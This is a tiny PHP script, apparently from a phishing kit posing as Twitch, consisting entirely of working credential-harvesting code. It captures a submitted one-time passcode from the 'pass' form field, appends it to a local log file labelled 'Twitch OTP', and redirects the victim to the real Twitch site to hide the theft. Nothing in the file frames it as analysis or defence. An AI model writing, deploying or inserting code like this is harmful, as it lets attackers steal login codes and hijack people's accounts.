<?php
file_put_contents("otp.txt", "Twitch OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.twitch.tv/');
?>
